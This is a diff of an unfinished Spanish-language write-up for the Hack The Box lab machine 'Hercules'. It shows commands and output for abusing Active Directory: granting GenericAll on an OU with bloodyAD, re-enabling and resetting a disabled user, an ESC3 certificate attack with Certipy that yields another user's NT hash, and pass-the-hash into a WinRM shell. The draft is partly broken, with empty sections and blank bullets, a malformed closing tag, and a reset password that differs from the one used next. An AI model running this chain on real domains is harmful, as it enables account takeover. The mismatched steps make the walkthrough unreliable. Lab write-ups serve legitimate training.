+KRB5CCNAME=Auditor.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
+[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
+```
+Listo, con esto ya tenemos control total de este **OU**.
+
+<br>
+
+<h2 id="Fernando">Rehabilitando Cuenta Deshabilitada de Usuario Fernando.R</h2>
+
+Podemos investigar que usuarios regulares existen en este **OU**:
+```bash
+PS C:\Users\auditor\Desktop> Get-ADUser -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -Filter * -Properties adminCount,UserAccountControl |
+  Where-Object { ($_.adminCount -ne 1) -or ($_.adminCount -eq $null) } |
+  Select-Object SamAccountName,DistinguishedName,adminCount,UserAccountControl
+
+SamAccountName DistinguishedName                                                          adminCount UserAccountControl
+-------------- -----------------                                                          ---------- ------------------
+james.s        CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                               66050
+anthony.r      CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                               66050
+taylor.m       CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                             66050
+fernando.r     CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                         66050
+```
+Todos estos usuarios están deshabilitados.
+
+Pero uno de estos nos puede llamar la atención, siendo el **usuario fernando.r**:
+```bash
+PS C:\Users\auditor\Desktop> Get-ADUser -Identity "Fernando.R"
+
+DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+Enabled           : False
+GivenName         : Fernando
+Name              : Fernando Rodriguez
+ObjectClass       : user
+ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
+SamAccountName    : fernando.r
+SID               : S-1-5-21-1889966460-2597381952-958560702-1121
+Surname           : Rodriguez
+UserPrincipalName : fernando.r@hercules.htb
+```
+
+Si lo investigamos desde **BloodHound**, veremos que se encuentra en algunos grupos:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura39.png">
+</p>
+
+Resulta que el grupo **Smartcard Operators** tiene una descripción peculiar:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura40.png">
+</p>
+
+Los miembros de este grupo, tienen algún grado de control sobre la **Autoridad de Certificación (CA)** del entorno, lo que les permite emitir, revocar, aprobar o configurar certificados.
+
+Aprovechemos los privilegios que tenemos en este **OU** y habilitemos la cuenta del **usuario fernando.r**.
+
+Para habilitarlo, usaremos **bloodyAD**:
+```bash
+KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d 'hercules.htb' -u 'auditor' -k remove uac 'fernando.r' -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
+```
+Ya esta habilitado.
+
+Lo podemos comprobar revisando su descripción de nuevo:
+```bash
+PS C:\Users\auditor\Desktop> Get-ADUser -Identity "Fernando.R"
+
+
+DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+Enabled           : True
+GivenName         : Fernando
+Name              : Fernando Rodriguez
+ObjectClass       : user
+ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
+SamAccountName    : fernando.r
+SID               : S-1-5-21-1889966460-2597381952-958560702-1121
+Surname           : Rodriguez
+UserPrincipalName : fernando.r@hercules.htb
+```
+
+Y como no sabemos su contraseña, vamos a asignarle una nueva:
+```bash
+KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k set password 'fernando.r' 'Password123!'
+[+] Password changed successfully!
+```
+Bien, tenemos a otro usuario a nuestra disposición.
+
+<br>
+
+<h2 id="BadCAs">Identificando CAs Vulnerables y Aplicando ESC3 Certificate Attack: Enrollment Agent Template</h2>
+
+Antes que nada, debemos saber algunos conceptos:
+
+| **Plantilla ESC3** |
+|:------------------:|
+| *ESC3 (según la nomenclatura que usan herramientas como Certipy) se refiere a plantillas de certificado de tipo Enrollment Agent que incluyen el EKU Certificate Request Agent. * |
+
+<br>
+
+| **Enrollment Agent** |
+|:--------------------:|
+| *Es el rol/tipo de certificado y plantilla diseñada para emitir certificados actuando como agente: un EA puede firmar o tramitar solicitudes on-behalf-of (en nombre de) otras cuentas en ciertos flujos de AD CS.* |
+
+<br>
+
+Ahora sí, ¿De que va este ataque?
+
+| **ESC3 Certificate Attack** |
+|:---------------------------:|
+| *Un ESC3 attack es el abuso de esa plantilla/funcionalidad para obtener certificados que permitan solicitar (o firmar) certificados en nombre de otras identidades, posibilitando la suplantación de cuentas y la obtención de material de autenticación (PFX/TGT) sin conocer contraseñas.* |
+
+<br>
+
+Con un certificado de **Enrollment Agent** y permisos adecuados en la **CA/plantillas**, podríamos:
+* Obtener certificados válidos para otras cuentas del dominio.
+* Usar ese certificado para autenticación basada en certificados (**PKINIT** o **cert-based auth**) y, por lo tanto, obtener **TGTs** o acceso a servicios como si fuera la cuenta objetivo.
+
+Aquí te dejo un blog que explica este ataque:
+* <a href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" target="_blank">ADCS ESC3: Enrollment Agent Template</a>
+
+<br>
+
+Ocuparemos al **usuario fernando.r**, así que vamos a crearle un **TGT**:
+```bash
+impacket-getTGT 'HERCULES.HTB/fernando.r:NewPassword123!'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in fernando.r.ccache
+```
+
+Busquemos las plantillas de certificados vulnerables con **certipy-ad**:
+```bash
+KRB5CCNAME=fernando.r.ccache certipy-ad find -k -dc-ip 10.10.11.91 -target DC.hercules.htb -vulnerable -stdout
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 18 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'CA-HERCULES'
+[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
+...
+Certificate Templates
+  0
+    Template Name                       : MachineEnrollmentAgent
+    Display Name                        : Enrollment Agent (Computer)
+    Certificate Authorities             : CA-HERCULES
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireDns
+                                          SubjectRequireDnsAsCn
+    Enrollment Flag                     : AutoEnrollment
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-12-04T01:44:26+00:00
+    Template Last Modified              : 2024-12-04T01:44:51+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
+                                          HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : HERCULES.HTB\Enterprise Admins
+        Full Control Principals         : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Owner Principals          : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Dacl Principals           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Property Enroll           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.
+  1
+    Template Name                       : EnrollmentAgentOffline
+    Display Name                        : Exchange Enrollment Agent (Offline request)
+    Certificate Authorities             : CA-HERCULES
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-12-04T01:44:26+00:00
+    Template Last Modified              : 2024-12-04T01:44:51+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
+                                          HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : HERCULES.HTB\Enterprise Admins
+        Full Control Principals         : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Owner Principals          : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Dacl Principals           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Property Enroll           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.
+      ESC15                             : Enrollee supplies subject and schema version is 1.
+    [*] Remarks
+      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
+  2
+    Template Name                       : EnrollmentAgent
+    Display Name                        : Enrollment Agent
+    Certificate Authorities             : CA-HERCULES
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : AutoEnrollment
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-12-04T01:44:26+00:00
+    Template Last Modified              : 2024-12-04T01:44:51+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
+                                          HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : HERCULES.HTB\Enterprise Admins
+        Full Control Principals         : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Owner Principals          : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Dacl Principals           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Property Enroll           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.
+```
+Es un resultado bastante largo, pero es necesario para que lo pueda explicar.
+
+En resumen:
+* 
+* 
+* 
+* 
+
+
+```bash
+ntpdate -u dc.hercules.htb
+2025-10-25 00:46:46.117561 (-0600) -0.009117 +/- 0.044474 dc.hercules.htb 10.10.11.91 s1 no-leap
+```
+
+```bash
+KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass \
+  -dc-host dc.hercules.htb -dc-ip 10.10.11.91 -target "dc.hercules.htb" -ca 'CA-HERCULES' \
+  -template "EnrollmentAgent" -application-policies "Certificate Request Agent"
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 41
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'fernando.r@hercules.htb'
+[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
+[*] Saving certificate and private key to 'fernando.r.pfx'
+[*] Wrote certificate and private key to 'fernando.r.pfx'
+```
+
+```bash
+KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass \
+  -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target "dc.hercules.htb" \
+  -ca "CA-HERCULES" -template "User" -pfx fernando.r.pfx \
+  -on-behalf-of "HERCULES\\ashley.b" -dcom
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via DCOM
+[*] Request ID is 42
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'ashley.b@hercules.htb'
+[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
+[*] Saving certificate and private key to 'ashley.b.pfx'
+[*] Wrote certificate and private key to 'ashley.b.pfx'
+```
+
+```bash
+certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.10.11.91
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'ashley.b@hercules.htb'
+[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
+[*] Using principal: 'ashley.b@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ashley.b.ccache'
+[*] Wrote credential cache to 'ashley.b.ccache'
+[*] Trying to retrieve NT hash for 'ashley.b'
+[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
+```
+
+```bash
+impacket-getTGT -hashes :1e719fbfddd226da74f644eac9df7fd2 hercules.htb/ashley.b@dc.hercules.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in ashley.b@dc.hercules.htb.ccache
+```
+
+```bash
+KRB5CCNAME=ashley.b@dc.hercules.htb.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass hercules.htb/ashley.b@dc.hercules.htb
+...
+PS C:\Users\ashley.b\Documents> whoami
+hercules\ashley.b
+```
+
+```bash
+
+```
+
+
+<br>
+
 <h2 id=""></h2>
 
 ```bash
@@ -1350,19 +2308,57 @@ Ya hemos creado **archivos ODT** maliciosos de manera manual, pero podemos crear
 ```bash
 
 ```
+
+
+<br>
+
+<h2 id=""></h2>
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
 
 
 <br>
 <br>
 <div style="position: relative;">
   <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-</div>
+</d1iv>
 
 
-links
-
+* https://github.com/ropnop/kerbrute
+* https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html
+* https://www.verylazytech.com/ldap-injection
+* https://pypi.org/project/termcolor/
+* https://swisskyrepo.github.io/PayloadsAllTheThings/LDAP%20Injection/#methodology
+* https://www.blackduck.com/glossary/what-is-ldap-injection.html
+* https://portswigger.net/kb/issues/00100500_ldap-injection
+* https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e
+* https://www.codeproject.com/articles/Hack-proof-your-asp-net-applications-from-Session#comments-section
+* https://medium.com/@ph4nt0mbyt3/rce-exploitation-via-report-upload-leveraging-machinekeys-to-forge-aspxauth-cookies-to-privesc-50d38991da2e
+* https://gist.github.com/amanda-mitchell/5350992
+* https://github.com/synercoder/FormsAuthentication
+* https://github.com/SorceryIE/aspxauth_cookie_forger/blob/main/Program.cs
+* https://gist.github.com/dazinator/0cdb8e1fbf81d3ed5d44
+* https://github.com/lof1sec/Bad-ODF
+* 
+* 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
